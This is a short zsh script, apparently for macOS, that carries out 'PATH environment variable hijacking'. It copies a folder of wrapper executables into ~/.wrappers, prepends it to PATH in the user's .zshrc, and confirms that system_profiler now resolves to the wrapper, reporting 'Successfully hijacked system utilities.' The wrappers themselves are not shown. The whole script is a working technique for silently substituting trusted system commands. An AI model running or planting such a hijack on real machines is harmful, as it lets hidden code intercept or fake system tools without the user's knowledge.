#!/bin/zsh

# Step 1 - PATH environment variable hijacking
TARGET_CONFIG_FILE="/Users/$USER/.zshrc"

if [ -f "$TARGET_CONFIG_FILE" ]; then
    cp "$TARGET_CONFIG_FILE" "$TARGET_CONFIG_FILE.orig"
else
    touch "$TARGET_CONFIG_FILE"
fi

WRAPPERS_DIR="/Users/$USER/.wrappers"
mkdir -p "$WRAPPERS_DIR"
cp -R wrappers/ "$WRAPPERS_DIR"
find "$WRAPPERS_DIR" -type f ! -name "*.txt" -exec chmod +x {} \;

NEW_PATH_VALUE="export PATH=\"$WRAPPERS_DIR:\$PATH\""

if grep -Fxq "$NEW_PATH_VALUE" "$TARGET_CONFIG_FILE"
then
    echo "The directory containing the wrappers is already included in the PATH."
else
    echo "$NEW_PATH_VALUE" >> "$TARGET_CONFIG_FILE"
    echo "The directory containing the wrappers has been added to $TARGET_CONFIG_FILE."

    source "$TARGET_CONFIG_FILE"
fi

# Validation
SYSTEM_PROFILER_PATH=$(which system_profiler)
if [[ "$SYSTEM_PROFILER_PATH" == "$WRAPPERS_DIR"* ]]; then
    echo "Successfully hijacked system utilities."
else
    echo "Error hijacking system utilities: the path is $SYSTEM_PROFILER_PATH"
fi